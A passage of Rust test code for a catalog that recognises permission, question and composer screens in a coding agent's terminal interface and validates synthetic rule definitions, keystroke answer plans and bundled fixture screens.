    /// ungated session-scoped `later` plan and a plan-less `accept` choice, and a choice-less
    /// question notice.
    pub(crate) fn question_fixture_definition() -> Value {
        let mut value = synthetic_definitions();
        let rules = value["profiles"][0]["rules"].as_array_mut().unwrap();
        rules.push(json!({
            "id":QUESTION_RULE,"priority":100,"observation":"question",
            "region":{"screen":"either","start_pattern":"^Synthetic question\\?$","end_pattern":"^Question end$","max_rows":8,"cursor":"any"},
            "matchers":[
                {"id":"heading","scope":"line","pattern":"^Synthetic question\\?$"},
                {"id":"focus","scope":"line","pattern":"^> \\S","focus_style":"marker"},
                {"id":"accept","scope":"line","pattern":"^(?:> |  )(?P<label>Accept the change)$"},
                {"id":"decline","scope":"line","pattern":"^(?:> |  )(?P<label>Keep \\S.*)$"},
                {"id":"later","scope":"line","pattern":"^(?:> |  )(?P<label>Ask later)$"}
            ],
            "extract":{"operation":null,"choices":[
                {"id":"accept","label":{"matcher_id":"accept","capture":"label"},"scope":"persistent"},
                {"id":"decline","label":{"matcher_id":"decline","capture":"label"},"scope":"persistent"},
                {"id":"later","label":{"matcher_id":"later","capture":"label"},"scope":"session"}
            ],"native_request_id":null},
            "verified_noninteraction":false,"sensitive":false
        }));
        rules.push(json!({
            "id":QUESTION_NOTICE_RULE,"priority":100,"observation":"question",
            "region":{"screen":"either","start_pattern":"^Synthetic notice$","end_pattern":"^Synthetic notice$","max_rows":1,"cursor":"any"},
            "matchers":[{"id":"notice","scope":"line","pattern":"^Synthetic notice$"}],
            "extract":{"operation":null,"choices":[],"native_request_id":null},
            "verified_noninteraction":false,"sensitive":false
        }));
        value["profiles"][0]["capabilities"]["detection"]["rule_ids"] =
            json!([RULE, QUESTION_RULE, QUESTION_NOTICE_RULE]);
        value["profiles"][0]["capabilities"]["answers"] = json!([
            answer(
                "allow",
                RULE,
                "synthetic-question-profile-allow",
                "allow-once",
                "79"
            ),
            choice_answer(
                QUESTION_RULE,
                QUESTION_DECLINE_PLAN,
                "decline",
                json!([
                    question_stage("0e", "decline", Some("accept")),
                    question_stage("0d", "decline", Some("decline"))
                ])
            ),
            choice_answer(
                QUESTION_RULE,
                QUESTION_LATER_PLAN,
                "later",
                json!([question_stage("33", "later", None)])
            )
        ]);
        value
    }

    /// `focused` names the choices drawn with the `> ` marker: `accept`, `decline`, `later`,
    /// several of them, or none.
    pub(crate) fn question_fixture_form(focused: &[&str]) -> Vec<u8> {
        let row = |choice: &str, label: &str| {
            let marker = if focused.contains(&choice) {
                "> "
            } else {
                "  "
            };
            format!("{marker}{label}")
        };
        format!(
            "\x1b[0m\x1b[2J\x1b[19;1HSynthetic question?\r\n{}\r\n{}\r\n{}\r\nQuestion end",
            row("accept", "Accept the change"),
            row("decline", "Keep current"),
            row("later", "Ask later")
        )
        .into_bytes()
    }

    pub(crate) fn question_notice_form() -> Vec<u8> {
        b"\x1b[0m\x1b[2J\x1b[19;1HSynthetic notice".to_vec()
    }

    pub(crate) const VERSION: &str = "0.0.1-synthetic";
    pub(crate) const RULE: &str = "synthetic-permission";
    pub(crate) const FIXTURE: &str = "synthetic-permission-1";
    pub(crate) fn simple_definition(kind: &str, verified: bool) -> Value {
        let mut value = synthetic_definitions();
        let rule = &mut value["profiles"][0]["rules"][0];
        rule["id"] = json!(format!("synthetic-{kind}"));
        rule["observation"] = json!(kind);
        rule["region"]["start_pattern"] = json!("^Synthetic state$");
        rule["region"]["end_pattern"] = json!("^State end$");
        rule["matchers"] = json!([{"id":"state","scope":"line","pattern":"^Synthetic state$"}]);
        rule["extract"] = json!({"operation":null,"choices":[],"native_request_id":null});
        rule["verified_noninteraction"] = json!(verified);
        let declaration = json!({"rule_ids":[format!("synthetic-{kind}")],"fixture_ids":[FIXTURE]});
        value["profiles"][0]["capabilities"] = if kind.starts_with("composer_") {
            json!({"detection":null,"composer":declaration,"annotations":null,"answers":[]})
        } else {
            json!({"detection":declaration,"composer":null,"annotations":null,"answers":[]})
        };
        value
    }

    pub(crate) mod annotation {
        use crate::coding_agent::catalog::test_support::*;
        pub(crate) const REFUSAL: &str = "synthetic-auto-refusal";
        pub(crate) const UNAVAILABLE: &str = "synthetic-auto-unavailable";
        pub(crate) const AVAILABLE: &str = "synthetic-auto-indicator";

        pub(crate) fn annotation_rule(id: &str, observation: &str) -> Value {
            let (start, matchers, operation) = match observation {
                "automatic_refusal" => (
                    "^Refused: ",
                    json!([
                        {"id":"operation","scope":"line","pattern":"^Refused: (?P<operation>.+)$"},
                        {"id":"decoration","scope":"line","pattern":"^Refusal end$"}
                    ]),
                    json!({"matcher_id":"operation","capture":"operation"}),
                ),
                "automatic_review_unavailable" => (
                    "^Automatic review unavailable$",
                    json!([{"id":"notice","scope":"line","pattern":"^Automatic review unavailable$"}]),
                    Value::Null,
                ),
                _ => (
                    "^Mode: automatic$",
                    json!([{"id":"badge","scope":"line","pattern":"^Mode: automatic$"}]),
                    Value::Null,
                ),
            };
            let end = if observation == "automatic_refusal" {
                "^Refusal end$"
            } else {
                start
            };
            json!({"id":id,"priority":50,"observation":observation,
                "region":{"screen":"either","start_pattern":start,"end_pattern":end,"max_rows":4,"cursor":"any"},
                "matchers":matchers,
                "extract":{"operation":operation,"choices":[],"native_request_id":null},
                "verified_noninteraction":false,"sensitive":false,
                "frame":{"require_patterns":["^Live footer$"],"reject_patterns":["^Transcript viewer$"]}})
        }

        pub(crate) fn annotated() -> Value {
            let mut value = synthetic_definitions();
            let rules = value["profiles"][0]["rules"].as_array_mut().unwrap();
            rules.push(annotation_rule(REFUSAL, "automatic_refusal"));
            rules.push(annotation_rule(UNAVAILABLE, "automatic_review_unavailable"));
            rules.push(annotation_rule(AVAILABLE, "automatic_review_available"));
            value["profiles"][0]["capabilities"]["annotations"] =
                json!({"rule_ids":[REFUSAL, UNAVAILABLE, AVAILABLE],"fixture_ids":[FIXTURE]});
            value
        }

        pub(crate) fn rule<'a>(value: &'a mut Value, id: &str) -> &'a mut Value {
            value["profiles"][0]["rules"]
                .as_array_mut()
                .unwrap()
                .iter_mut()
                .find(|rule| rule["id"] == id)
                .expect("declared synthetic rule")
        }
    }

    use crate::broker::runtime::Coverage;

    use serde_json::Value;

    pub(crate) const EMPTY: &str = "synthetic-composer_empty";
    pub(crate) const DRAFT: &str = "synthetic-composer_draft";
    pub(crate) const PROMPT_FIXTURE: &str = "synthetic-prompt-plan";
    pub(crate) const EXEC_FIXTURE: &str = "synthetic-exec-plan";
    pub(crate) const VERSION_TWO: &str = "0.0.2-synthetic";

    pub(crate) fn definition(prompt: Option<&str>, exec: Option<&str>) -> Value {
        let mut value = simple_definition("composer_empty", true);
        let draft = simple_definition("composer_draft", true)["profiles"][0]["rules"][0].clone();
        value["profiles"][0]["rules"]
            .as_array_mut()
            .unwrap()
            .push(draft);
        for id in [PROMPT_FIXTURE, EXEC_FIXTURE] {
            let mut fixture = value["fixtures"][0].clone();
            fixture["id"] = json!(id);
            value["fixtures"].as_array_mut().unwrap().push(fixture);
        }
        let prompt = prompt.map(
            |submit| json!({"prefix_hex":"","submit_hex":submit,"fixture_ids":[PROMPT_FIXTURE]}),
        );
        let exec = exec.map(
            |submit| json!({"prefix_hex":"2120","submit_hex":submit,"fixture_ids":[EXEC_FIXTURE]}),
        );
        value["profiles"][0]["capabilities"]["composer"] = json!({
            "rule_ids":[DRAFT,EMPTY],"fixture_ids":[FIXTURE],
            "submission":{"prompt":prompt,"exec":exec}
        });
        value
    }

    pub(crate) fn operation_name(operation: ComposerOperation) -> &'static str {
        match operation {
            ComposerOperation::Prompt => "prompt",
            ComposerOperation::Exec => "exec",
        }
    }

    pub(crate) fn operation_prefix(operation: ComposerOperation) -> &'static [u8] {
        match operation {
            ComposerOperation::Prompt => b"",
            ComposerOperation::Exec => b"! ",
        }
    }

    pub(crate) fn plan(catalog: &ProfileCatalog, operation: ComposerOperation) -> ComposerPlan {
        catalog
            .composer_plan(CodingAgent::Codex, VERSION, operation)
            .expect("valid selected operation has an executable plan")
    }

    pub(crate) fn capabilities(
        catalog: &ProfileCatalog,
        backend: CodingAgent,
        version: Option<&str>,
        observation: Coverage,
        operations: (Coverage, Coverage),
    ) {
        let actual = catalog.capabilities(backend, version);
        assert_eq!(actual.composer, observation);
        assert_eq!(actual.prompt_submission, operations.0);
        assert_eq!(actual.native_exec_submission, operations.1);
    }

    pub(crate) fn metadata(plan: &ComposerPlan, fixtures: &[String]) {
        assert_eq!(plan.backend(), CodingAgent::Codex);
        assert_eq!(plan.native_version(), VERSION);
        assert_eq!(plan.rule_ids(), &[DRAFT.to_owned(), EMPTY.to_owned()]);
        assert_eq!(plan.fixture_ids(), fixtures);
    }

    pub(crate) fn reject(
        good: &Value,
        bad: &Value,
        operation: ComposerOperation,
        label: &str,
    ) -> CafleetError {
        let catalog = ProfileCatalog::from_definitions(good).unwrap();
        let _ = plan(&catalog, operation)
            .encode("same-operation positive control")
            .unwrap();
        match ProfileCatalog::from_definitions(bad) {
            Err(error) => error,
            Ok(_) => panic!("invalid executable definition rejected: {label}"),
        }
    }

    pub(crate) fn expected(operation: ComposerOperation, literal: &str, submit: &[u8]) -> Vec<u8> {
        let mut bytes = operation_prefix(operation).to_vec();
        bytes.extend_from_slice(literal.as_bytes());
        bytes.extend_from_slice(submit);
        bytes
    }
}

#[cfg(test)]
mod tests {
    use crate::broker::runtime::Coverage;
    use crate::broker::runtime::InteractionClass;
    use crate::broker::runtime::InteractionCloseReason;
    use crate::broker::runtime::RuntimeEventKind;
    use crate::broker::runtime::evidence::EvidencePolicy;
    use crate::coding_agent::catalog::test_support::synthetic_definitions as definitions;
    use crate::coding_agent::catalog::test_support::*;

    use crate::coding_agent::catalog::*;
    use crate::coding_agent::detector::test_support::*;
    use crate::runtime::observation::test_support::*;
    use crate::runtime::*;
    use serde_json::Value;
    use serde_json::json;
    use std::collections::BTreeSet;
    use std::time::Duration;
    use std::time::Instant;

    mod panel_separator {
        use crate::coding_agent::catalog::tests::*;

        fn with_separator(pointer: &str, separator: Value) -> Value {
            let mut value = crate::coding_agent::catalog::test_support::annotation::annotated();
            value.pointer_mut(pointer).unwrap()["region"]["panel_separator"] = separator;
            value
        }

        #[test]
        fn a_region_loads_with_one_non_whitespace_panel_separator_glyph() {
            for pointer in ["/profiles/0/rules/0", "/profiles/0/rules/1"] {
                for glyph in ["│", "|", "┃"] {
                    let value = with_separator(pointer, json!(glyph));
                    ProfileCatalog::from_definitions(&value)
                        .unwrap_or_else(|cause| panic!("{pointer} {glyph}: {}", cause.message()));
                }
            }
            let question = question_fixture_definition();
            let mut value = question.clone();
            value["profiles"][0]["rules"][1]["region"]["panel_separator"] = json!("│");
            assert!(ProfileCatalog::from_definitions(&value).is_ok());
            assert!(
                ProfileCatalog::from_definitions(&question).is_ok(),
                "panel_separator stays optional"
            );
        }

        #[test]
        fn a_panel_separator_that_is_not_one_non_whitespace_glyph_is_refused() {
            for separator in [
                json!(""),
                json!(" "),
                json!("\t"),
                json!("\u{a0}"),
                json!("││"),
                json!("ab"),
                json!(1),
                json!(["│"]),
                Value::Null,
            ] {
                let value = with_separator("/profiles/0/rules/0", separator.clone());
                assert!(
                    ProfileCatalog::from_definitions(&value).is_err(),
                    "{separator}"
                );
            }
        }
    }

    mod question_answers {
        use crate::coding_agent::catalog::tests::*;

        const QUESTION: &str = "/profiles/0/rules/1";
        const ANSWERS: &str = "/profiles/0/capabilities/answers";

        fn refusal(value: &Value) -> String {
            assert!(ProfileCatalog::from_definitions(&question_fixture_definition()).is_ok());
            match ProfileCatalog::from_definitions(value) {
                Err(cause) => cause.message().into_owned(),
                Ok(_) => panic!("the changed definition loads"),
            }
        }
        fn changed(change: impl FnOnce(&mut Value)) -> Value {
            let mut value = question_fixture_definition();
            change(&mut value);
            value
        }
        fn answers(value: &mut Value) -> &mut Vec<Value> {
            value.pointer_mut(ANSWERS).unwrap().as_array_mut().unwrap()
        }
        fn plan(catalog: &ProfileCatalog, request: &str, key: AnswerKey) -> Option<AnswerPlan> {
            catalog.answer_plan(CodingAgent::Codex, VERSION, request, &key)
        }
        fn choice(id: &str) -> AnswerKey {
            AnswerKey::Choice(id.into())
        }

        #[test]
        fn a_choice_answer_resolves_by_its_question_rule_and_choice_key() {
            let catalog = ProfileCatalog::from_definitions(&question_fixture_definition()).unwrap();
            let decline = plan(&catalog, QUESTION_RULE, choice("decline")).expect("decline plan");
            let capability = decline.capability();
            assert_eq!(capability.key(), &choice("decline"));
            assert_eq!(capability.backend(), CodingAgent::Codex);
            assert_eq!(capability.native_version(), VERSION);
            assert_eq!(capability.request_rule_id(), QUESTION_RULE);
            assert_eq!(capability.answer_rule_id(), QUESTION_DECLINE_PLAN);
            assert_eq!(capability.fixture_ids(), [FIXTURE.to_owned()]);
            assert_eq!(decline.choice_id(), "decline");
            assert_eq!(decline.focus_matcher_id(), "focus");
            let stages = decline
                .stages()
                .iter()
                .map(|stage| {
                    (
                        stage.bytes().to_vec(),
                        stage.required_rule_id().to_owned(),
                        stage.required_choice_id().to_owned(),
                        stage.required_focus_choice_id().map(str::to_owned),
                    )
                })
                .collect::<Vec<_>>();
            assert_eq!(
                stages,
                [
                    (
                        vec![0x0e],
                        QUESTION_RULE.to_owned(),
                        "decline".to_owned(),
                        Some("accept".to_owned())
                    ),
                    (
                        vec![0x0d],
                        QUESTION_RULE.to_owned(),
                        "decline".to_owned(),
                        Some("decline".to_owned())
                    ),
                ]
            );
            let later = plan(&catalog, QUESTION_RULE, choice("later")).expect("later plan");
            assert_eq!(later.capability().answer_rule_id(), QUESTION_LATER_PLAN);
            assert_eq!(later.stages().len(), 1);
            assert_eq!(later.stages()[0].bytes(), b"3");
            assert!(later.stages()[0].gate().is_none());
            assert!(plan(&catalog, QUESTION_RULE, choice("accept")).is_none());
            assert!(plan(&catalog, QUESTION_RULE, choice("missing")).is_none());
            for decision in [PermissionDecision::Allow, PermissionDecision::Deny] {
                assert!(plan(&catalog, QUESTION_RULE, AnswerKey::Decision(decision)).is_none());
            }
            assert!(plan(&catalog, QUESTION_NOTICE_RULE, choice("decline")).is_none());
            let allow = plan(
                &catalog,
                RULE,
                AnswerKey::Decision(PermissionDecision::Allow),
            )
            .expect("the decision plan beside the choice plans");
            assert_eq!(
                allow.capability().key(),
                &AnswerKey::Decision(PermissionDecision::Allow)
            );
            assert!(plan(&catalog, RULE, choice("allow-once")).is_none());
            assert!(
                plan(
                    &catalog,
                    RULE,
                    AnswerKey::Decision(PermissionDecision::Deny)
                )
                .is_none()
            );
        }

        #[test]
        fn a_choice_answer_loads_for_every_declared_choice_scope() {
            for scope in ["single_request", "session", "persistent"] {
                let value = changed(|value| {
                    value.pointer_mut(QUESTION).unwrap()["extract"]["choices"][2]["scope"] =
                        json!(scope);
                });
                let catalog = ProfileCatalog::from_definitions(&value)
                    .unwrap_or_else(|cause| panic!("{scope}: {}", cause.message()));
                assert!(
                    plan(&catalog, QUESTION_RULE, choice("later")).is_some(),
                    "{scope}"
                );
            }
        }

        #[test]
        fn a_choice_answer_on_a_permission_rule_is_refused() {
            let value = changed(|value| {
                answers(value).push(choice_answer(
                    RULE,
                    "synthetic-choice-on-permission",
                    "deny-once",
                    json!([{"bytes_hex":"6e","required_rule_id":RULE,"required_choice_id":"deny-once"}]),
                ));
            });
            assert_eq!(
                refusal(&value),
                "invalid native profile: choice answer requires question form"
            );
        }

        #[test]
        fn a_decision_answer_on_a_question_rule_is_refused() {
            for (decision, choice) in [("allow", "decline"), ("deny", "later")] {
                let value = changed(|value| {
                    let mut entry = answers(value)[1].clone();
                    entry["decision"] = json!(decision);
                    entry["choice_id"] = json!(choice);
                    entry["answer_rule_id"] = json!("synthetic-decision-on-question");
                    entry["stages"] = json!([question_stage("33", choice, None)]);
                    answers(value).push(entry);
                });
                assert_eq!(
                    refusal(&value),
                    "invalid native profile: answer requires permission form",
                    "{decision}"
                );
            }
        }

        #[test]
        fn a_decision_answer_still_requires_a_single_request_choice() {
            let value = changed(|value| {
                value["profiles"][0]["rules"][0]["extract"]["choices"][0]["scope"] =
                    json!("session");
            });
            assert_eq!(
                refusal(&value),
                "invalid native profile: answer requires single-request scope"
            );
        }

        #[test]
        fn a_choice_answer_naming_no_rule_choice_is_refused() {
            let value = changed(|value| {
                answers(value)[2]["choice_id"] = json!("never");
                answers(value)[2]["stages"] = json!([question_stage("33", "never", None)]);
            });
            assert_eq!(
                refusal(&value),
                "invalid native profile: unknown answer choice"
            );
        }

        #[test]
        fn a_duplicate_question_rule_and_choice_pair_is_refused() {
            let value = changed(|value| {
                let mut duplicate = answers(value)[2].clone();
                duplicate["answer_rule_id"] = json!("synthetic-question-later-again");
                answers(value).push(duplicate);
            });
            assert!(ProfileCatalog::from_definitions(&value).is_err());
            let other_choice = changed(|value| {
                let mut accept = answers(value)[2].clone();
                accept["answer_rule_id"] = json!("synthetic-question-decline-digit");
                accept["choice_id"] = json!("decline");
                accept["stages"] = json!([question_stage("32", "decline", None)]);
                answers(value).push(accept);
            });
            assert!(
                ProfileCatalog::from_definitions(&other_choice).is_err(),
                "a second plan for the same choice is a duplicate"
            );
        }

        #[test]
        fn a_choice_id_follows_the_lowercase_hyphenated_shape_up_to_64_bytes() {
            let renamed = |id: &str| {
                changed(|value| {
                    value.pointer_mut(QUESTION).unwrap()["extract"]["choices"][2]["id"] = json!(id);
                    answers(value)[2]["choice_id"] = json!(id);
                    answers(value)[2]["stages"] = json!([question_stage("33", id, None)]);
                })
            };
            for id in ["ask-later-2", "a", &"a".repeat(64)] {
                let catalog = ProfileCatalog::from_definitions(&renamed(id))
                    .unwrap_or_else(|cause| panic!("{id}: {}", cause.message()));
                assert!(plan(&catalog, QUESTION_RULE, choice(id)).is_some(), "{id}");
            }
            for id in [
                "Later",
                "ask_later",
                "-later",
                "later-",
                "ask--later",
                "ask later",
                &"a".repeat(65),
            ] {
                assert!(
                    ProfileCatalog::from_definitions(&renamed(id)).is_err(),
                    "{id} is outside the choice-id shape"
                );
            }
        }

        #[test]
        fn a_choice_answer_validates_its_stages_like_a_decision_answer() {
            for (case, stages) in [
                ("no stage", json!([])),
                ("escape byte", json!([question_stage("1b", "later", None)])),
                (
                    "escape inside a stage",
                    json!([question_stage("331b", "later", None)]),
                ),
                (
                    "uppercase hex",
                    json!([question_stage("0D", "later", None)]),
                ),
                (
                    "another choice in a stage",
                    json!([question_stage("33", "decline", None)]),
                ),
                (
                    "another rule in a stage",
                    json!([{"bytes_hex":"33","required_rule_id":RULE,"required_choice_id":"later"}]),
                ),
                (
                    "partly gated",
                    json!([
                        question_stage("0e", "later", Some("accept")),
                        question_stage("0d", "later", None)
                    ]),
                ),
                (
                    "gate ending on another choice",
                    json!([question_stage("0d", "later", Some("decline"))]),
                ),
            ] {
                let value = changed(|value| answers(value)[2]["stages"] = stages);
                assert!(ProfileCatalog::from_definitions(&value).is_err(), "{case}");
            }
            for (case, fixtures) in [
                ("no fixture", json!([])),
                ("unknown fixture", json!(["missing"])),
            ] {
                let value = changed(|value| answers(value)[2]["fixture_ids"] = fixtures);
                assert!(ProfileCatalog::from_definitions(&value).is_err(), "{case}");
            }
            let value = changed(|value| answers(value)[2]["focus_matcher_id"] = json!("missing"));
            assert!(
                ProfileCatalog::from_definitions(&value).is_err(),
                "unknown focus matcher"
            );
        }

        #[test]
        fn marker_focus_loads_and_gates_a_choice_plan() {
            let catalog = ProfileCatalog::from_definitions(&question_fixture_definition()).unwrap();
            assert!(plan(&catalog, QUESTION_RULE, choice("decline")).is_some());
            let unstyled = changed(|value| {
                value.pointer_mut(QUESTION).unwrap()["matchers"][1]
                    .as_object_mut()
                    .unwrap()
                    .remove("focus_style");
            });
            assert_eq!(
                refusal(&unstyled),
                "invalid native profile: a focus-gated plan needs a focus_style matcher"
            );
            let background = changed(|value| {
                value.pointer_mut(QUESTION).unwrap()["matchers"][1]["focus_style"] =
                    json!("background");
            });
            assert!(ProfileCatalog::from_definitions(&background).is_ok());
            for style in [json!("Marker"), json!("glyph"), json!(""), Value::Null] {
                let value = changed(|value| {
                    value.pointer_mut(QUESTION).unwrap()["matchers"][1]["focus_style"] =
                        style.clone();
                });
                assert!(ProfileCatalog::from_definitions(&value).is_err(), "{style}");
            }
        }

        #[test]
        fn marker_focus_gates_a_decision_plan_as_background_focus_does() {
            let mut marker = gated_fixture_definition();
            marker["profiles"][0]["rules"][0]["matchers"][2]["focus_style"] = json!("marker");
            let catalog = ProfileCatalog::from_definitions(&marker).unwrap();
            let deny = catalog
                .answer_plan(
                    CodingAgent::Codex,
                    VERSION,
                    GATED_RULE,
                    &AnswerKey::Decision(PermissionDecision::Deny),
                )
                .expect("a marker-gated decision plan");
            assert_eq!(
                deny.stages()[0].required_focus_choice_id(),
                Some("allow-once")
            );
        }

        #[test]
        fn an_interaction_frame_loads_with_a_reject_pattern_and_optional_require_patterns() {
            for require in [json!([]), json!(["^Synthetic question\\?$"])] {
                let value = changed(|value| {
                    value.pointer_mut(QUESTION).unwrap()["frame"] =
                        json!({"require_patterns":require,"reject_patterns":["^Live composer$"]});
                });
                ProfileCatalog::from_definitions(&value)
                    .unwrap_or_else(|cause| panic!("{require}: {}", cause.message()));
            }
            let permission = changed(|value| {
                value["profiles"][0]["rules"][0]["frame"] =
                    json!({"require_patterns":[],"reject_patterns":["^Live composer$"]});
            });
            assert!(ProfileCatalog::from_definitions(&permission).is_ok());
        }

        #[test]
        fn an_interaction_frame_requires_a_reject_pattern() {
            for rule in [QUESTION, "/profiles/0/rules/0"] {
                let value = changed(|value| {
                    value.pointer_mut(rule).unwrap()["frame"] =
                        json!({"require_patterns":[],"reject_patterns":[]});
                });
                assert_eq!(
                    refusal(&value),
                    "invalid native profile: interaction frame requires a reject pattern",
                    "{rule}"
                );
            }
            for (case, frame) in [
                ("missing reject patterns", json!({"require_patterns":[]})),
                (
                    "missing require patterns",
                    json!({"reject_patterns":["^Live composer$"]}),
                ),
                (
                    "uncompilable reject pattern",
                    json!({"require_patterns":[],"reject_patterns":["^(unclosed$"]}),
                ),
                (
                    "unknown frame field",
                    json!({"require_patterns":[],"reject_patterns":["^Live composer$"],"extra":true}),
                ),
            ] {
                let value = changed(|value| value.pointer_mut(QUESTION).unwrap()["frame"] = frame);
                assert!(ProfileCatalog::from_definitions(&value).is_err(), "{case}");
            }
        }

        #[test]
        fn an_annotation_frame_still_requires_a_live_screen_pattern() {
            let mut value = crate::coding_agent::catalog::test_support::annotation::annotated();
            crate::coding_agent::catalog::test_support::annotation::rule(
                &mut value,
                crate::coding_agent::catalog::test_support::annotation::REFUSAL,
            )["frame"]["require_patterns"] = json!([]);
            match ProfileCatalog::from_definitions(&value) {
                Err(cause) => assert_eq!(
                    cause.message(),
                    "invalid native profile: annotation frame requires a live-screen pattern"
                ),
                Ok(_) => panic!("an annotation frame without a require pattern loads"),
            }
        }
    }

    mod bundled_backend_files {
        use crate::coding_agent::catalog::ProfileCatalog;
        use crate::coding_agent::catalog::tests::definitions;
        use crate::error::CafleetError;
        use serde_json::Value;
        use serde_json::json;

        const SOURCE: &str = "native/codex.json";
        const PRIMARY: &str = "native-permission-one";
        const REGRESSION: &str = "native-regression-one";
        const UNCITED: &str =
            "invalid native profile: bundled fixture file holds an uncited screen";

        struct NativeFixtureCatalog {
            definitions: Value,
            file: Value,
        }

        fn screen(line: &str) -> Value {
            let mut lines = vec![""; 24];
            lines[0] = line;
            json!({
                "rows":24,"cols":80,"alternate_screen":true,"screen_seq":0,
                "cursor_row":23,"cursor_col":0,"lines":lines,"masked_rows":[]
            })
        }

        fn screen_digest(screen: &Value) -> String {
            crate::digest::sha256_hex(crate::digest::canonical_json(screen).as_bytes())
        }

        impl NativeFixtureCatalog {
            fn new() -> Self {
                let primary = screen("permission screen");
                let regression = screen("regression screen");
                let mut definitions = definitions();
                let entry = &mut definitions["fixtures"][0];
                entry["id"] = json!(PRIMARY);
                entry["kind"] = json!("native");
                entry["native_version"] = json!("1.2.3");
                entry["source_ref"] = json!(SOURCE);
                entry["sha256"] = json!(screen_digest(&primary));
                let mut sibling = entry.clone();
                sibling["id"] = json!(REGRESSION);
                sibling["sha256"] = json!(screen_digest(&regression));
                definitions["fixtures"]
                    .as_array_mut()
                    .unwrap()
                    .push(sibling);
                definitions["profiles"][0]["min_version"] = json!("1.2.3");
                definitions["profiles"][0]["capabilities"]["detection"]["fixture_ids"] =
                    json!([PRIMARY]);

                let mut screens = serde_json::Map::new();
                screens.insert(PRIMARY.to_owned(), primary);
                screens.insert(REGRESSION.to_owned(), regression);
                Self {
                    definitions,
                    file: json!({
                        "schema_version":1,"backend":"codex","provenance":"native",
                        "screens":screens
                    }),
                }
            }

            fn load_embedded(
                &self,
                embedded: &[(&str, &[u8])],
            ) -> Result<ProfileCatalog, CafleetError> {
                ProfileCatalog::from_definitions(&self.definitions).unwrap_or_else(|error| {
                    panic!("native test declarations are valid: {}", error.message())
                });
                ProfileCatalog::from_bundled_definitions(&self.definitions, embedded)
            }

            fn load(&self) -> Result<ProfileCatalog, CafleetError> {
                let bytes = serde_json::to_vec(&self.file).unwrap();
                self.load_embedded(&[(SOURCE, &bytes)])
            }
        }

        fn usage_failure(result: Result<ProfileCatalog, CafleetError>) -> String {
            match result {
                Err(CafleetError::Usage(message)) => message,
                Err(error) => panic!("native loader returns a usage error: {}", error.message()),
                Ok(_) => panic!("native loader rejects the invalid bundled file"),
            }
        }

        #[test]
        fn loads_multiple_screens_including_a_catalogued_regression_without_profile_citations() {
            let result = NativeFixtureCatalog::new().load();
            let failure = result.as_ref().err().map(|error| error.message());
            assert!(
                result.is_ok(),
                "valid backend screen map loads: {failure:?}"
            );
        }

        #[test]
        fn a_catalogued_screen_requires_its_key_in_the_backend_file() {
            let mut fixture = NativeFixtureCatalog::new();
            fixture.file["screens"]
                .as_object_mut()
                .unwrap()
                .remove(REGRESSION);
            assert_eq!(
                usage_failure(fixture.load()),
                "invalid native profile: bundled fixture screen is missing"
            );
        }

        #[test]
        fn a_referenced_backend_file_rejects_an_uncited_sibling_screen() {
            let mut fixture = NativeFixtureCatalog::new();
            fixture.file["screens"]["unlisted-screen"] = screen("uncited screen");
            assert_eq!(usage_failure(fixture.load()), UNCITED);
        }

        fn unreferenced_file_failure(extra_first: bool) -> String {
            let fixture = NativeFixtureCatalog::new();
            let bytes = serde_json::to_vec(&fixture.file).unwrap();
            let extra = serde_json::to_vec(&json!({
                "schema_version":1,"backend":"claude","provenance":"native",
                "screens":{"unlisted-screen":screen("uncited file screen")}
            }))
            .unwrap();
            let mut embedded = vec![
                (SOURCE, bytes.as_slice()),
                ("native/claude.json", extra.as_slice()),
            ];
            if extra_first {
                embedded.reverse();
            }
            usage_failure(fixture.load_embedded(&embedded))
        }

        #[test]
        fn an_uncited_screen_in_an_unreferenced_file_is_rejected_before_referenced_files() {
            assert_eq!(unreferenced_file_failure(true), UNCITED);
        }

        #[test]
        fn an_uncited_screen_in_an_unreferenced_file_is_rejected_after_referenced_files() {
            assert_eq!(unreferenced_file_failure(false), UNCITED);
        }

        #[test]
        fn file_schema_provenance_and_backend_match_the_catalog() {
            let causes = [
                ("schema_version", json!(2)),
                ("provenance", json!("synthetic")),
                ("backend", json!("claude")),
            ]
            .map(|(field, value)| {
                let mut fixture = NativeFixtureCatalog::new();
                fixture.file[field] = value;
                usage_failure(fixture.load())
            });
            assert_eq!(
                causes,
                ["invalid native profile: bundled fixture file identity differs from its catalog entry";
                    3]
            );
        }

        #[test]
        fn a_catalogued_regression_screen_digest_error_names_its_id_and_both_hashes() {
            let mut fixture = NativeFixtureCatalog::new();
            let recorded = fixture.definitions["fixtures"][1]["sha256"]
                .as_str()
                .unwrap()
                .to_owned();
            fixture.file["screens"][REGRESSION]["lines"][0] = json!("changed regression");
            let computed = screen_digest(&fixture.file["screens"][REGRESSION]);
            assert_ne!(recorded, computed);
            assert_eq!(
                usage_failure(fixture.load()),
                format!(
                    "invalid native profile: bundled fixture digest mismatch for {REGRESSION}: catalog {recorded}, computed {computed}"
                )
            );
        }

        #[test]
        fn canonical_screen_digests_accept_compact_and_pretty_backend_files() {
            let fixture = NativeFixtureCatalog::new();
            let failures = [
                serde_json::to_vec(&fixture.file).unwrap(),
                serde_json::to_vec_pretty(&fixture.file).unwrap(),
            ]
            .map(|bytes| {
                fixture
                    .load_embedded(&[(SOURCE, &bytes)])
                    .err()
                    .map(|error| error.message().into_owned())
            });
            assert_eq!(failures, [None, None]);
        }

        #[test]
        fn a_catalogued_source_requires_provided_embedded_bytes() {
            let fixture = NativeFixtureCatalog::new();
            assert_eq!(
                usage_failure(fixture.load_embedded(&[])),
                "invalid native profile: bundled fixture bytes are not embedded"
            );
        }
    }

    type ScreenChange = (&'static str, fn(&mut Value));

    fn first_masked_or_empty_row(screen: &Value) -> u64 {
        screen["masked_rows"]
            .as_array()
            .unwrap()
            .first()
            .map(|mask| mask["row"].as_u64().unwrap())
            .or_else(|| {
                screen["lines"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .position(|line| line == "")
                    .map(|row| row as u64)
            })
            .unwrap_or(0)
    }

    fn push_mask(screen: &mut Value, row: u64, reason: &str) {
        screen["masked_rows"]
            .as_array_mut()
            .unwrap()
            .push(json!({"row":row,"reason":reason}));
    }

    const SCREEN_CHANGES: [ScreenChange; 11] = [
        ("extra field", |s| s["note"] = json!("unreviewed")),
        ("missing masked rows", |s| {
            s.as_object_mut().unwrap().remove("masked_rows");
        }),
        ("nonempty masked row", |s| {
            let masked = s["masked_rows"]
                .as_array()
                .unwrap()
                .first()
                .map(|mask| mask["row"].as_u64().unwrap() as usize);
            match masked {
                Some(row) => s["lines"][row] = json!("restored header"),
                None => {
                    let row = s["lines"]
                        .as_array()
                        .unwrap()
                        .iter()
                        .position(|line| line != "")
                        .unwrap() as u64;
